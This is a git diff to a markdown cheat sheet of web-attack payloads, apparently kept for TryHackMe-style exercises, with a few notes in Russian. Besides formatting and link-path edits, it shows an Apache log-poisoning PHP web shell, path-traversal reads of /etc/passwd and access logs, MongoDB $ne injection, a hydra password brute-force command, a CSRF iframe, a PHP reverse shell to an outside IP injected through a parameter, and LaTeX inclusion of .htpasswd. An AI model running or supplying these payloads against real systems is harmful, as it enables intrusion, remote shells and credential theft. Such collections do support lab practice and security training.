@@ -58,7 +58,6 @@ curl "http://10.10.62.183/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
 http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='command'
 ```
 ---
----
 #### cadaver for WebDAV
 ---
 #### payload in json format
@@ -107,10 +106,12 @@ search[$ne]=string #mongodb
 ```
 ---
 #### brute force login
-![png](login.png)
+![png](./src/src_for_src/login.png)
+
 ```
 hydra -l admin -P /usr/share/seclists/rockyou.txt $IP http-get /inferno
 ```
+---
 #### CSRF
 ```
 <iframe style="display:none" name="csrf-frame"></iframe>
@@ -148,7 +149,7 @@ file/etc/%3F/../passwd?
 ────────────────────────────────────────────
 можно удалять эвенты в html, которые выполняют фильтровку 
 ────────────────────────────────────────────
-w'h'o'a'm'i
+w'h'o'a'm'i'
 ────────────────────────────────────────────
 what=order&id=5$(php -r '$sock=fsockopen("10.18.22.27",5555);exec("sh <&3 >&3 2>&3");')
 ────────────────────────────────────────────
@@ -186,7 +187,9 @@ register admin user with admin%00
 ────────────────────────────────────────────
 index.php~ - сохнарить sourse code
 ────────────────────────────────────────────
+bypass filter with new line
 ────────────────────────────────────────────
+?q=[]=test
 ────────────────────────────────────────────
 ────────────────────────────────────────────
 ```
@@ -196,5 +199,5 @@ index.php~ - сохнарить sourse code
 $\lstinputlisting{/var/www/dev/.htpasswd}$
 ```
 #### links
-- [steal admin cookie/sqli](marketplace.md) (tryhackme:marketplace)
-- [ohmyweb](omyweb.md)
+- [steal admin cookie/sqli](./src/marketplace.md) (tryhackme:marketplace)
+- [ohmyweb](./src/omyweb.md)
